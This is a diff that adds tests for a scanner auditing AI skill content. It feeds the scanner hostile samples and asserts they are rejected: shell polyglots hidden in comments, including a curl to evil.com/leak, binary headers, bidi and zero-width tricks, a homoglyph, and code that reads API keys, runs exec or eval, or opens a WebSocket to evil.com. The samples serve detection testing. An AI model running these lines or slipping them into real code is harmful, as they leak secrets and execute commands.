@@ -203,4 +203,67 @@ const fallbackBundle = auditAndBuildSkill({
 assert.equal(fallbackBundle.skillName, "custom-skill");
 console.log("✓ Slug generation falls back safely to 'custom-skill'");
 
+// 19. Multiline and Single-Line Polyglot Vectors (ERR_SEC_POLYGLOT)
+for (const poly of [
+  "<!--\n#!/bin/bash\nwhoami\n-->",
+  "<!--\ncurl http://evil.com/leak\n-->",
+  "<!--\n$(whoami)\n-->",
+  "/*\n#!/bin/bash\n*/",
+  '"""\n:\nexec(cmd)\n"""'
+]) {
+  const r = auditSkillContent(poly);
+  assert.equal(r.isSafe, false, `Failed for polyglot: ${poly}`);
+  assert.ok(r.violations.some((v) => v.ruleId === "ERR_SEC_POLYGLOT"), `Expected ERR_SEC_POLYGLOT for ${poly}`);
+}
+console.log("✓ All multiline and single-line polyglot attacks rejected");
+
+// 20. Binary Magic Headers (ERR_SEC_POLYGLOT)
+for (const binHeader of ["\x7fELF\x02\x01\x01", "PK\x03\x04\x14\x00", "\x1f\x8b\x08\x00", "MZ\x90\x00\x03"]) {
+  const r = auditSkillContent(binHeader + "# Prompt content");
+  assert.equal(r.isSafe, false, `Failed for binary header: ${binHeader}`);
+  assert.ok(r.violations.some((v) => v.ruleId === "ERR_SEC_POLYGLOT"), `Expected ERR_SEC_POLYGLOT for binary header`);
+}
+console.log("✓ All binary magic byte headers rejected");
+
+// 21. Unicode Directional Bidi Overrides (UNICODE_BIDI_OVERRIDE)
+const bidiContent = "Verify transaction \u202E reverse check";
+const bidiReport = auditSkillContent(bidiContent);
+assert.equal(bidiReport.isSafe, false);
+assert.ok(bidiReport.violations.some((v) => v.ruleId === "UNICODE_BIDI_OVERRIDE"));
+console.log("✓ Directional Unicode bidi override attack rejected");
+
+// 22. Zero-Width Spaces (UNICODE_ZERO_WIDTH)
+const zwContent = "Zero\u200Bwidth\uFEFFstealth";
+const zwReport = auditSkillContent(zwContent);
+assert.ok(zwReport.zeroWidthStrippedCount >= 2);
+assert.ok(zwReport.violations.some((v) => v.ruleId === "UNICODE_ZERO_WIDTH"));
+console.log("✓ Invisible zero-width codepoints detected and stripped");
+
+// 23. Homoglyph Spoofing (HOMOGLYPH_SPOOFING)
+const homoContent = "Check p\u0430ssword token";
+const homoReport = auditSkillContent(homoContent);
+assert.equal(homoReport.isSafe, false);
+assert.ok(homoReport.violations.some((v) => v.ruleId === "HOMOGLYPH_SPOOFING"));
+console.log("✓ Mixed Latin/Cyrillic homoglyph spoofing detected and rejected");
+
+// 24. Dangerous AST Tokens (AST_TAINT_DANGEROUS_TOKEN)
+for (const tokenCode of [
+  'const { exec } = require("child_process");',
+  'const secret = process.env.API_KEY;',
+  'eval("evil()");',
+  'const fn = new Function("return 1");',
+  'const ws = new WebSocket("wss://evil.com");'
+]) {
+  const r = auditSkillContent(tokenCode);
+  assert.equal(r.isSafe, false, `Failed for dangerous token: ${tokenCode}`);
+  assert.ok(r.violations.some((v) => v.ruleId === "AST_TAINT_DANGEROUS_TOKEN"), `Expected AST_TAINT_DANGEROUS_TOKEN for ${tokenCode}`);
+}
+console.log("✓ Dangerous AST and ambient tokens rejected");
+
+// 25. Permission Ceiling Violation with Case Insensitivity
+const ceilReport = auditSkillContent("curl https://api.stripe.com/v1/charges", { ceiling: "local_first" });
+assert.equal(ceilReport.isSafe, false);
+assert.ok(ceilReport.violations.some((v) => v.ruleId === "HALT_PERMISSION_ESCALATION"));
+console.log("✓ Permission ceiling violation enforced under case-insensitive local_first ceiling");
+
 console.log("=== All clientAuditScanner & skillBuilder tests PASSED! ===");
